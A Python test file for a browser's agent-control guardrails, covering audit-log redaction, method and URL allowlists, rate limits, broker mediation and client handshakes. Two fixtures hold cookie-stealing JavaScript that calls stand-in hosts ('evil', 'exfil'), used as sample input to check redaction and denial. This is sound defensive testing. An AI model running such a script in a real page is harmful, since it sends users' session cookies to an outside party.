"""Guardrails for agent_control: all 6 layers.
See todo/browser/03-agent-guardrails.md.

Layer 1 — Audit logging
Layer 2 — Method allowlisting
Layer 3 — URL allowlisting
Layer 4 — Rate limiting
Layer 5 — Cross-silo broker mediation
Layer 6 — Client identity / handshake
"""

import logging
import os
import time
from unittest import mock

import pytest

# ---------------------------------------------------------------------------
# Stub client used by tests that exercise server.handle() directly
# without a live socket connection.
# ---------------------------------------------------------------------------

class _StubClient:
    """Minimal stand-in for ``_Client`` that satisfies handle()'s reads."""

    def __init__(self, fd=99, pid=None, exe_path=None, exe_digest=None):
        self.fd = fd
        self.pid = pid
        self.exe_path = exe_path
        self.exe_digest = exe_digest
        # Default True so tests of other layers are not blocked by the
        # production require_handshake=True default. Handshake tests
        # pass handshake_done=False explicitly.
        self.handshake_done = True
        self.handshake_exe = None
        self.handshake_pid = None
        self.attached_tabs = set()
        # L4 buckets — import here so test collection doesn't fail if
        # the import path breaks for an unrelated reason.
        from qdbrowser.plugins.agent_control import _RateBucket
        self.bucket_total = _RateBucket()
        self.bucket_screenshot = _RateBucket()
        self.bucket_eval = _RateBucket()
        self.bucket_open_tab = _RateBucket()


# ===================================================================
# Layer 1 — Audit logging
# ===================================================================

def test_redact_strips_sensitive_keys():
    from qdbrowser.plugins.agent_control import _redact_params
    params = {
        "tab_id": 1,
        "url": "https://example.com",
        "script": "fetch('https://evil/' + document.cookie)",
        "text": "supersecret",
        "keys": ["ctrl+a", "ctrl+c"],
        "png_b64": "AAAA",
    }
    out = _redact_params(params)
    assert out["tab_id"] == 1
    assert out["url"] == "https://example.com"
    assert out["script"].startswith("<redacted:")
    assert "fetch" not in out["script"]
    assert out["text"].startswith("<redacted:")
    assert "supersecret" not in out["text"]
    assert out["keys"].startswith("<redacted:")
    assert "ctrl" not in out["keys"]
    assert out["png_b64"].startswith("<redacted:")


def test_redact_preserves_none():
    from qdbrowser.plugins.agent_control import _redact_params
    out = _redact_params({"script": None, "tab_id": 5})
    assert out["script"] is None
    assert out["tab_id"] == 5


def test_redact_keeps_url_by_default():
    from qdbrowser.plugins.agent_control import _redact_params
    out = _redact_params({"url": "https://example.com"})
    assert out["url"] == "https://example.com"


def test_redact_strips_url_for_private():
    from qdbrowser.plugins.agent_control import _redact_params
    out = _redact_params({"url": "https://secret.example"}, redact_url=True)
    assert out["url"].startswith("<redacted:")
    assert "secret.example" not in out["url"]


def test_audit_log_redacts_private_open_tab_url(fresh_config, caplog):
    """open_tab with profile=private must not log the private URL."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    req = {
        "jsonrpc": "2.0", "id": 1,
        "method": "open_tab",
        "params": {"url": "https://secret.example/page",
                   "profile": "private"},
    }
    with caplog.at_level(logging.INFO, logger="qdbrowser.agent_control"):
        server.handle(_StubClient(), req)
    rpc_lines = [r.message for r in caplog.records if "AGENT_RPC " in r.message]
    joined = "\n".join(rpc_lines)
    assert rpc_lines
    assert "secret.example" not in joined
    assert "<redacted:" in joined
    # The profile name (the operation shape) is still visible.
    assert "private" in joined


def test_audit_log_keeps_normal_open_tab_url(fresh_config, caplog):
    """A default-profile open_tab still records the URL for audit value."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    req = {
        "jsonrpc": "2.0", "id": 1,
        "method": "open_tab",
        "params": {"url": "https://public.example/page",
                   "profile": "default"},
    }
    with caplog.at_level(logging.INFO, logger="qdbrowser.agent_control"):
        server.handle(_StubClient(), req)
    rpc_lines = [r.message for r in caplog.records if "AGENT_RPC " in r.message]
    joined = "\n".join(rpc_lines)
    assert "public.example" in joined


def test_audit_redacts_url_for_unresolvable_tab(fresh_config, caplog):
    """navigate to an unknown tab_id with a url fails closed: the URL is
    redacted rather than risk logging a private destination."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    req = {
        "jsonrpc": "2.0", "id": 1,
        "method": "navigate",
        "params": {"tab_id": 999999, "url": "https://maybe-private.example"},
    }
    with caplog.at_level(logging.INFO, logger="qdbrowser.agent_control"):
        server.handle(_StubClient(), req)
    rpc_lines = [r.message for r in caplog.records if "AGENT_RPC " in r.message]
    joined = "\n".join(rpc_lines)
    assert rpc_lines
    assert "maybe-private.example" not in joined
    assert "<redacted:" in joined


def test_redact_passthrough_non_dict():
    from qdbrowser.plugins.agent_control import _redact_params
    assert _redact_params(["a", "b"]) == ["a", "b"]
    assert _redact_params(None) is None


def test_audit_log_redacts_script(fresh_config, caplog):
    """End-to-end: a logged AGENT_RPC line for eval_js must not contain
    the JS source. Enforces the policy gate so the call is denied without
    needing a live webview.
    """
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    Config().set("agent_control", "policy_enforced", True)

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    req = {
        "jsonrpc": "2.0", "id": 1,
        "method": "eval_js",
        "params": {"tab_id": 1, "script": "fetch('https://exfil/' + document.cookie)"},
    }
    with caplog.at_level(logging.INFO, logger="qdbrowser.agent_control"):
        resp = server.handle(_StubClient(), req)
    assert "error" in resp
    assert resp["error"]["code"] == -32002
    assert "policy_denied" in resp["error"]["message"]
    # Audit log line was emitted and does not contain the JS source.
    rpc_lines = [r.message for r in caplog.records
                 if "AGENT_RPC" in r.message]
    assert rpc_lines, "no AGENT_RPC log line emitted"
    joined = "\n".join(rpc_lines)
    assert "exfil" not in joined
    assert "document.cookie" not in joined
    assert "<redacted:" in joined


def test_audit_log_emitted_when_policy_off(fresh_config, caplog):
    """Even with policy off, audit logging fires on every RPC."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    req = {
        "jsonrpc": "2.0", "id": 1,
        "method": "list_tabs",
        "params": {},
    }
    with caplog.at_level(logging.INFO, logger="qdbrowser.agent_control"):
        server.handle(_StubClient(), req)
    rpc_lines = [r.message for r in caplog.records
                 if "AGENT_RPC" in r.message]
    assert rpc_lines, "audit logging should fire regardless of policy state"
    assert "method=list_tabs" in rpc_lines[0]


def test_audit_log_includes_pid_and_exe(fresh_config, caplog):
    """Audit line includes the client PID and exe from handshake or
    accept-time identity."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    client = _StubClient(pid=12345, exe_path="/usr/bin/test-agent")
    req = {
        "jsonrpc": "2.0", "id": 1,
        "method": "list_tabs",
        "params": {},
    }
    with caplog.at_level(logging.INFO, logger="qdbrowser.agent_control"):
        server.handle(client, req)
    rpc_lines = [r.message for r in caplog.records
                 if "AGENT_RPC " in r.message and "method=list_tabs" in r.message]
    assert rpc_lines
    assert "pid=12345" in rpc_lines[0]
    assert "exe=/usr/bin/test-agent" in rpc_lines[0]


# ===================================================================
# Layer 2 — Method allowlisting
# ===================================================================

def test_hostname_match_exact():
    from qdbrowser.plugins.agent_control import _hostname_match
    assert _hostname_match("foo.com", "foo.com") is True
    assert _hostname_match("bar.foo.com", "foo.com") is False


def test_hostname_match_wildcard_requires_dot_boundary():
    """Regression: ``*.foo.com`` must not match ``evilfoo.com``."""
    from qdbrowser.plugins.agent_control import _hostname_match
    assert _hostname_match("a.foo.com", "*.foo.com") is True
    assert _hostname_match("deep.sub.foo.com", "*.foo.com") is True
    assert _hostname_match("evilfoo.com", "*.foo.com") is False
    # ``*.foo.com`` does not match the bare apex either.
    assert _hostname_match("foo.com", "*.foo.com") is False


def test_hostname_match_any():
    from qdbrowser.plugins.agent_control import _hostname_match_any
    patterns = ["docs.google.com", "*.github.com"]
    assert _hostname_match_any("docs.google.com", patterns) is True
    assert _hostname_match_any("api.github.com", patterns) is True
    assert _hostname_match_any("evil.example.com", patterns) is False


def test_policy_on_by_default(fresh_config):
    """policy_enforced defaults to True, so the dangerous methods are
    denied until the admin re-enables them via allowed_methods."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    plug = AgentControlPlugin()
    for m in ("eval_js", "type_text", "send_keys", "click_at",
              "dblclick_at", "move_mouse"):
        allowed, _ = plug._policy_check_method(m)
        assert allowed is False, f"{m} should be denied when policy on"


def test_policy_check_method_deny_when_enforced(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "policy_enforced", True)
    plug = AgentControlPlugin()
    for m in ("eval_js", "type_text", "send_keys", "click_at",
              "dblclick_at", "move_mouse"):
        allowed, _ = plug._policy_check_method(m)
        assert allowed is False, f"{m} should be denied when enforced"


def test_policy_check_method_safe_methods_when_enforced(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "policy_enforced", True)
    plug = AgentControlPlugin()
    for m in ("list_tabs", "navigate", "screenshot", "get_url",
              "reload", "open_tab"):
        allowed, _ = plug._policy_check_method(m)
        assert allowed is True, f"{m} should be allowed even when enforced"


def test_policy_check_method_admin_reenables_denied(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "policy_enforced", True)
    Config().set("agent_control", "allowed_methods", ["eval_js"])
    plug = AgentControlPlugin()
    allowed, _ = plug._policy_check_method("eval_js")
    assert allowed is True
    # type_text is still default-denied.
    allowed, _ = plug._policy_check_method("type_text")
    assert allowed is False


def test_policy_check_method_admin_adds_denial(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "policy_enforced", True)
    Config().set("agent_control", "denied_methods", ["screenshot"])
    plug = AgentControlPlugin()
    allowed, _ = plug._policy_check_method("screenshot")
    assert allowed is False


def test_policy_denied_returns_structured_error(fresh_config):
    """When policy denies a method, the response includes error code
    -32002 and mentions the method name."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer
    Config().set("agent_control", "policy_enforced", True)
    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    req = {
        "jsonrpc": "2.0", "id": 42,
        "method": "eval_js",
        "params": {"tab_id": 1, "script": "1+1"},
    }
    resp = server.handle(_StubClient(), req)
    assert resp["error"]["code"] == -32002
    assert "policy_denied" in resp["error"]["message"]
    assert "eval_js" in resp["error"]["message"]


# ===================================================================
# Layer 3 — URL allowlisting for navigation
# ===================================================================

def test_policy_check_url_no_lists_allows_everything(fresh_config):
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    plug = AgentControlPlugin()
    allowed, _ = plug._policy_check_url("https://anywhere.example.com/x")
    assert allowed is True


def test_policy_check_url_about_always_allowed(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "navigate_allowlist", ["only.example.com"])
    plug = AgentControlPlugin()
    for u in ("about:blank", "about:newtab", "about:config"):
        allowed, _ = plug._policy_check_url(u)
        assert allowed is True, u


def test_policy_check_url_allowlist(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "navigate_allowlist",
                 ["*.work.example.com", "docs.google.com"])
    plug = AgentControlPlugin()
    allowed, _ = plug._policy_check_url("https://app.work.example.com/x")
    assert allowed is True
    allowed, _ = plug._policy_check_url("https://docs.google.com/")
    assert allowed is True
    allowed, _ = plug._policy_check_url("https://evilwork.example.com/")
    assert allowed is False
    allowed, _ = plug._policy_check_url("https://random.example.com/")
    assert allowed is False


def test_policy_check_url_denylist_overrides_allowlist(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "navigate_allowlist", ["*.example.com"])
    Config().set("agent_control", "navigate_denylist",
                 ["bank.example.com"])
    plug = AgentControlPlugin()
    allowed, _ = plug._policy_check_url("https://app.example.com/")
    assert allowed is True
    allowed, reason = plug._policy_check_url("https://bank.example.com/")
    assert allowed is False
    assert "denylist" in reason


def test_policy_check_url_rejects_non_string(fresh_config):
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    plug = AgentControlPlugin()
    allowed, _ = plug._policy_check_url(12345)
    assert allowed is False


def test_policy_check_url_rejects_hostless_url(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "navigate_allowlist", ["example.com"])
    plug = AgentControlPlugin()
    allowed, _ = plug._policy_check_url("data:text/html,hello")
    assert allowed is False


# ===================================================================
# Layer 4 — Rate limiting
# ===================================================================

def test_rate_bucket_allows_within_limit():
    from qdbrowser.plugins.agent_control import _RateBucket
    b = _RateBucket(window_seconds=60.0)
    now = time.monotonic()
    for _ in range(5):
        assert b.allow(now, 5) is True
    # 6th should be denied.
    assert b.allow(now, 5) is False


def test_rate_bucket_evicts_old_hits():
    from qdbrowser.plugins.agent_control import _RateBucket
    b = _RateBucket(window_seconds=1.0)
    base = 1000.0
    for i in range(5):
        assert b.allow(base + i * 0.1, 5) is True
    # At t=base+0.5, all 5 slots are taken.
    assert b.allow(base + 0.5, 5) is False
    # After the window expires, the oldest hits fall off.
    assert b.allow(base + 1.1, 5) is True


def test_rate_bucket_retry_after():
    from qdbrowser.plugins.agent_control import _RateBucket
    b = _RateBucket(window_seconds=60.0)
    base = 1000.0
    for i in range(3):
        b.allow(base + i, 3)
    # All 3 slots consumed at t=1000, 1001, 1002.
    # retry_after at t=1005 should be ~55s (oldest=1000, expires at 1060).
    retry = b.retry_after(base + 5, 3)
    assert 54.0 < retry < 56.0


def test_rate_bucket_retry_after_zero_when_available():
    from qdbrowser.plugins.agent_control import _RateBucket
    b = _RateBucket(window_seconds=60.0)
    assert b.retry_after(time.monotonic(), 10) == 0.0


def test_rate_bucket_none_limit_uncapped():
    """limit=None means uncapped — always allows."""
    from qdbrowser.plugins.agent_control import _RateBucket
    b = _RateBucket(window_seconds=1.0)
    now = time.monotonic()
    for _ in range(100):
        assert b.allow(now, None) is True


def test_rate_bucket_zero_limit_always_denies():
    from qdbrowser.plugins.agent_control import _RateBucket
    b = _RateBucket(window_seconds=60.0)
    assert b.allow(time.monotonic(), 0) is False


def test_rate_check_allows_within_defaults(fresh_config):
    """Default limits are generous enough for normal use."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    plug = AgentControlPlugin()
    client = _StubClient()
    for _ in range(10):
        ok, reason, retry = plug._rate_check(client, "list_tabs")
        assert ok is True, f"unexpectedly denied: {reason}"


def test_rate_check_denies_screenshot_over_limit(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "screenshot_rate_limit_per_minute", 3)
    plug = AgentControlPlugin()
    client = _StubClient()
    for _ in range(3):
        ok, _, _ = plug._rate_check(client, "screenshot")
        assert ok is True
    ok, reason, retry = plug._rate_check(client, "screenshot")
    assert ok is False
    assert "screenshot" in reason
    assert retry > 0


def test_rate_check_denies_eval_js_over_limit(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "eval_rate_limit_per_minute", 2)
    plug = AgentControlPlugin()
    client = _StubClient()
    for _ in range(2):
        ok, _, _ = plug._rate_check(client, "eval_js")
        assert ok is True
    ok, reason, retry = plug._rate_check(client, "eval_js")
    assert ok is False
    assert "eval_js" in reason


def test_rate_check_denies_open_tab_over_limit(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "open_tab_rate_limit_per_minute", 2)
    plug = AgentControlPlugin()
    client = _StubClient()
    for _ in range(2):
        ok, _, _ = plug._rate_check(client, "open_tab")
        assert ok is True
    ok, reason, _ = plug._rate_check(client, "open_tab")
    assert ok is False
    assert "open_tab" in reason


def test_rate_check_denies_total_over_limit(fresh_config):
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "rate_limit_per_minute", 5)
    plug = AgentControlPlugin()
    client = _StubClient()
    for _ in range(5):
        ok, _, _ = plug._rate_check(client, "list_tabs")
        assert ok is True
    ok, reason, _ = plug._rate_check(client, "list_tabs")
    assert ok is False
    assert "total" in reason


def test_rate_limited_response_has_retry_after(fresh_config):
    """When the server returns rate_limited, the error object contains
    a ``retry_after`` field with the number of seconds to wait."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer
    Config().set("agent_control", "screenshot_rate_limit_per_minute", 1)
    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    client = _StubClient()
    # First call succeeds.
    req = {"jsonrpc": "2.0", "id": 1, "method": "screenshot",
           "params": {"tab_id": 1}}
    resp = server.handle(client, req)
    # The method itself will fail (no webview), but the rate limiter
    # should have let it through. Second call should be rate-limited.
    req["id"] = 2
    resp = server.handle(client, req)
    assert "error" in resp
    assert resp["error"]["code"] == -32005
    assert "rate_limited" in resp["error"]["message"]
    assert "retry_after" in resp["error"]
    assert isinstance(resp["error"]["retry_after"], int)
    assert resp["error"]["retry_after"] >= 0


def test_rate_limited_request_does_not_count(fresh_config):
    """A denied request must not consume a bucket slot — it should not
    make the 'window' for the next allowed call any longer."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "screenshot_rate_limit_per_minute", 2)
    plug = AgentControlPlugin()
    client = _StubClient()
    # Fill up the bucket.
    for _ in range(2):
        plug._rate_check(client, "screenshot")
    # These denials should not grow the bucket.
    for _ in range(100):
        ok, _, _ = plug._rate_check(client, "screenshot")
        assert ok is False
    # The bucket len should still be 2.
    assert len(client.bucket_screenshot) == 2


def test_rate_check_per_client_isolation(fresh_config):
    """Each client has independent rate buckets."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "rate_limit_per_minute", 3)
    plug = AgentControlPlugin()
    c1 = _StubClient(fd=1)
    c2 = _StubClient(fd=2)
    for _ in range(3):
        plug._rate_check(c1, "list_tabs")
    # c1 is exhausted.
    ok, _, _ = plug._rate_check(c1, "list_tabs")
    assert ok is False
    # c2 is independent and should still have quota.
    ok, _, _ = plug._rate_check(c2, "list_tabs")
    assert ok is True


# ===================================================================
# Layer 5 — Cross-silo broker mediation
# ===================================================================

def test_broker_disabled_by_default(fresh_config):
    """With broker_enabled=false, _broker_mediate always allows."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    plug = AgentControlPlugin()
    ok, reason = plug._broker_mediate("eval_js", {"tab_id": 1})
    assert ok is True


def test_broker_enabled_calls_dbus(fresh_config):
    """When broker_enabled=true, _broker_mediate calls _broker_check
    for methods in the mediated set."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin

    Config().set("agent_control", "broker_enabled", True)
    plug = AgentControlPlugin()

    with mock.patch("qdbrowser.plugins.agent_control._broker_check") as m:
        m.return_value = (True, "allowed", True)
        ok, reason = plug._broker_mediate("eval_js", {"tab_id": 1})
        assert ok is True
        m.assert_called_once()
        # Verify the method name was passed.
        args = m.call_args
        assert args[0][0] == "eval_js"


def test_broker_denies_method(fresh_config):
    """When the broker says deny, the call is blocked."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin

    Config().set("agent_control", "broker_enabled", True)
    plug = AgentControlPlugin()

    with mock.patch("qdbrowser.plugins.agent_control._broker_check") as m:
        m.return_value = (False, "cross_silo_blocked", True)
        ok, reason = plug._broker_mediate("eval_js", {})
        assert ok is False
        assert "cross_silo_blocked" in reason


def test_broker_unreachable_fails_closed_when_enforced(fresh_config):
    """When policy_enforced=true and broker is unreachable, fail closed."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin

    Config().set("agent_control", "broker_enabled", True)
    Config().set("agent_control", "policy_enforced", True)
    plug = AgentControlPlugin()

    with mock.patch("qdbrowser.plugins.agent_control._broker_check") as m:
        m.return_value = (True, "bus_unreachable", False)
        ok, reason = plug._broker_mediate("eval_js", {})
        assert ok is False
        assert "unreachable" in reason


def test_broker_unreachable_fails_open_when_not_enforced(fresh_config):
    """When policy_enforced=false and broker is unreachable, fail open."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin

    Config().set("agent_control", "broker_enabled", True)
    Config().set("agent_control", "policy_enforced", False)
    plug = AgentControlPlugin()

    with mock.patch("qdbrowser.plugins.agent_control._broker_check") as m:
        m.return_value = (True, "bus_unreachable", False)
        ok, reason = plug._broker_mediate("eval_js", {})
        assert ok is True


def test_broker_skips_non_mediated_methods(fresh_config):
    """Methods not in the mediated set skip the broker entirely."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin

    Config().set("agent_control", "broker_enabled", True)
    plug = AgentControlPlugin()

    with mock.patch("qdbrowser.plugins.agent_control._broker_check") as m:
        ok, reason = plug._broker_mediate("list_tabs", {})
        assert ok is True
        m.assert_not_called()


def test_broker_mediated_methods_include_defaults(fresh_config):
    """The broker-mediated set always includes _DEFAULT_DENIED_METHODS."""
    from qdbrowser.plugins.agent_control import _DEFAULT_DENIED_METHODS, AgentControlPlugin
    plug = AgentControlPlugin()
    mediated = plug._broker_mediated_methods()
    for m in _DEFAULT_DENIED_METHODS:
        assert m in mediated


def test_broker_mediated_methods_include_config_extras(fresh_config):
    """Admin can add extra methods to the broker-mediated set."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
    Config().set("agent_control", "broker_mediated_methods", ["screenshot"])
    plug = AgentControlPlugin()
    mediated = plug._broker_mediated_methods()
    assert "screenshot" in mediated


def test_broker_check_redacts_params(fresh_config):
    """_broker_check passes redacted params to the broker, never raw
    script source or typed text."""
    from qdbrowser.plugins.agent_control import _broker_check

    # We can't actually call the broker, but we can mock the D-Bus
    # layer and verify what's sent.
    with mock.patch("qdbrowser.plugins.agent_control.open_dbus_connection",
                    create=True) as mock_conn_fn:
        mock_conn = mock.MagicMock()
        mock_conn_fn.return_value = mock_conn
        reply = mock.MagicMock()
        reply.body = (True, "ok")
        mock_conn.send_and_get_reply.return_value = reply

        # The function needs jeepney — if not installed, the test
        # verifies the graceful fallback instead.
        try:
            ok, reason, reachable = _broker_check(
                "eval_js",
                {"script": "document.cookie", "tab_id": 1},
                bus_name="org.test.Broker",
                object_path="/org/test/Broker",
                interface="org.test.Broker",
                timeout_ms=500)
        except Exception:
            # jeepney not installed — verify we get a graceful fallback.
            ok, reason, reachable = _broker_check(
                "eval_js", {},
                bus_name="org.test.Broker",
                object_path="/org/test/Broker",
                interface="org.test.Broker",
                timeout_ms=500)
            assert reachable is False
            return

        # If jeepney is installed and the mock worked, verify the call.
        if reachable:
            call_args = mock_conn.send_and_get_reply.call_args
            assert call_args is not None


# ===================================================================
# Layer 6 — Client identity / handshake
# ===================================================================

def test_proc_exe_digest_returns_none_for_bogus_pid():
    from qdbrowser.plugins.agent_control import _proc_exe_digest
    exe, digest = _proc_exe_digest(999999999)
    assert exe is None
    assert digest is None


def test_proc_exe_digest_returns_path_for_self():
    """Reading /proc/self/exe should return a valid path."""

    from qdbrowser.plugins.agent_control import _proc_exe_digest
    pid = os.getpid()
    exe, digest = _proc_exe_digest(pid)
    # On Linux, this should resolve to the python interpreter.
    assert exe is not None
    assert digest is not None
    assert len(digest) == 64  # SHA256 hex


def test_file_sha256_returns_none_for_missing():
    from qdbrowser.plugins.agent_control import _file_sha256
    assert _file_sha256("/nonexistent/path/to/file") is None


def test_file_sha256_returns_hex_for_real_file(tmp_path):
    from qdbrowser.plugins.agent_control import _file_sha256
    f = tmp_path / "test.bin"
    f.write_bytes(b"hello world")
    digest = _file_sha256(str(f))
    assert digest is not None
    assert len(digest) == 64
    # Known SHA256 of "hello world".
    import hashlib
    expected = hashlib.sha256(b"hello world").hexdigest()
    assert digest == expected


def test_resolve_allowed_exes_paths(tmp_path):
    """Path entries are resolved to their SHA256."""
    from qdbrowser.plugins.agent_control import _resolve_allowed_exes
    f = tmp_path / "agent"
    f.write_bytes(b"#!/bin/sh\necho hi\n")
    result = _resolve_allowed_exes([str(f)])
    assert len(result) == 1
    import hashlib
    expected = hashlib.sha256(b"#!/bin/sh\necho hi\n").hexdigest()
    assert expected in result


def test_resolve_allowed_exes_sha256_entries():
    from qdbrowser.plugins.agent_control import _resolve_allowed_exes
    hex_str = "a" * 64
    result = _resolve_allowed_exes([f"sha256:{hex_str}"])
    assert hex_str in result


def test_resolve_allowed_exes_skips_bad_entries():
    from qdbrowser.plugins.agent_control import _resolve_allowed_exes
    result = _resolve_allowed_exes([
        "not-absolute",
        "sha256:tooshort",
        "/nonexistent/binary",
        "",
        None,
    ])
    assert len(result) == 0


def test_handshake_protocol_basic(fresh_config):
    """A handshake frame is processed and returns verified status."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    client = _StubClient()
    pid = os.getpid()
    # Claim our own exe.
    try:
        our_exe = os.readlink(f"/proc/{pid}/exe")
    except OSError:
        pytest.skip("cannot read /proc/self/exe")
    req = {
        "op": "handshake",
        "exe": our_exe,
        "pid": pid,
        "id": 1,
    }
    resp = server.handle(client, req)
    assert "result" in resp
    assert resp["result"]["ok"] is True
    assert resp["result"]["verified"] is True
    assert client.handshake_done is True
    assert client.handshake_exe == our_exe
    assert client.handshake_pid == pid


def test_handshake_rejects_invalid_pid(fresh_config):
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    client = _StubClient()
    req = {"op": "handshake", "exe": "/usr/bin/python3", "pid": -1, "id": 1}
    resp = server.handle(client, req)
    assert "error" in resp
    assert resp["error"]["code"] == -32602


def test_handshake_mismatched_exe(fresh_config):
    """If claimed exe doesn't match /proc/<pid>/exe, verified=False."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    client = _StubClient()
    req = {
        "op": "handshake",
        "exe": "/nonexistent/binary",
        "pid": os.getpid(),
        "id": 1,
    }
    resp = server.handle(client, req)
    assert "result" in resp
    assert resp["result"]["verified"] is False
    # Failed verification does not grant handshake_done.
    assert client.handshake_done is False


def test_handshake_logged(fresh_config, caplog):
    """Handshake produces an AGENT_RPC_HANDSHAKE log line."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    client = _StubClient()
    req = {
        "op": "handshake",
        "exe": "/usr/bin/test",
        "pid": os.getpid(),
        "id": 1,
    }
    with caplog.at_level(logging.INFO, logger="qdbrowser.agent_control"):
        server.handle(client, req)
    hs_lines = [r.message for r in caplog.records
                if "AGENT_RPC_HANDSHAKE" in r.message]
    assert hs_lines, "handshake should produce a log line"
    assert "/usr/bin/test" in hs_lines[0]


def test_require_handshake_blocks_rpc(fresh_config):
    """When require_handshake=true, RPCs before handshake are rejected."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    Config().set("agent_control", "require_handshake", True)
    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    client = _StubClient()
    client.handshake_done = False
    req = {
        "jsonrpc": "2.0", "id": 1,
        "method": "list_tabs",
        "params": {},
    }
    resp = server.handle(client, req)
    assert "error" in resp
    assert resp["error"]["code"] == -32007
    assert "handshake_required" in resp["error"]["message"]


def test_require_handshake_allows_after_handshake(fresh_config):
    """After completing handshake, RPCs proceed normally."""
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    Config().set("agent_control", "require_handshake", True)
    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    client = _StubClient()
    # Handshake first — use the actual exe so verification succeeds.
    actual_exe = os.readlink(f"/proc/{os.getpid()}/exe")
    hs = {"op": "handshake", "exe": actual_exe, "pid": os.getpid(),
          "id": 0}
    server.handle(client, hs)
    assert client.handshake_done is True
    # Now a normal RPC should not be blocked by the handshake gate.
    req = {
        "jsonrpc": "2.0", "id": 1,
        "method": "list_tabs",
        "params": {},
    }
    resp = server.handle(client, req)
    # list_tabs will fail (no window) but not with handshake_required.
    if "error" in resp:
        assert resp["error"]["code"] != -32007


def test_handshake_required_by_default(fresh_config):
    """require_handshake defaults to True, so RPCs without handshake fail."""
    from qdbrowser.plugins.agent_control import AgentControlPlugin, _AgentServer

    plug = AgentControlPlugin()
    server = _AgentServer(plug, window=None)
    client = _StubClient()
    client.handshake_done = False
    req = {
        "jsonrpc": "2.0", "id": 1,
        "method": "list_tabs",
        "params": {},
    }
    resp = server.handle(client, req)
    assert "error" in resp
    assert resp["error"]["code"] == -32007


# ===================================================================
# Layer 2 — SIGHUP config reload
# ===================================================================

def test_sighup_reloads_config(fresh_config, monkeypatch):
    """SIGHUP triggers config singleton reset so new policy takes
    effect without restart."""
    import signal as sig

    # This test verifies CONFIG-reload semantics, not user-agent pinning (the
    # latter is covered by test_user_agent.py::test_sighup_repins_profiles).
    # The reload's incidental pin_all_profiles() call lazily materializes Qt's
    # global defaultProfile() in a process that never opened a WebView, leaving
    # an orphan profile whose static teardown races the Chromium GPU/IPC
    # subprocess at interpreter exit -> intermittent native "Fatal Python
    # error: Aborted" under load. Stub the side-effect out (mirrors the sibling
    # SIGHUP test); none of the assertions below depend on it.
    from qdbrowser import webview as _wv_mod
    from qdbrowser.config import Config
    from qdbrowser.plugins.agent_control import AgentControlPlugin
